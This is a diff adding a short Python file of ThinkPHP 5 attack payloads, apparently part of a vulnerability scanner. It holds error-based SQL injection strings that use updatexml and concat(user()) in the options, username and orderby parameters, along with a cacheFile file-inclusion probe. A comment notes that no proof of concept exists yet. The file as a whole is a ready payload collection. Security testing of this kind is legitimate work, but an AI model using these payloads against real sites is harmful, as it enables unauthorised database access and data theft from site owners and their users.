@@ -1,0 +1,36 @@
+#!/usr/bin/env python3
+# -*- coding:utf-8 -*-
+
+# * 以下payload暂时没写poc
+thinkphp_5_options_sqlinject_payloads = [
+    {
+        'path': 'index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 **',
+        'data': ''
+    },
+    {
+        'path': 'index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23',
+        'data': ''
+    }
+]
+thinkphp_5_username_sqlinject_payloads = [
+    {
+        'path': 'index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1 ',
+        'data': ''
+    },
+    {
+        'path': '?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0 ',
+        'data': ''
+    }
+]
+thinkphp_5_orderby_sqlinject_payloads = [
+    {
+        'path': 'index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1 ',
+        'data': ''
+    }
+]
+thinkphp_5_include_payloads = [
+    {
+        'path': 'index/index/index?cacheFile=1.jpg',
+        'data': ''
+    }
+]
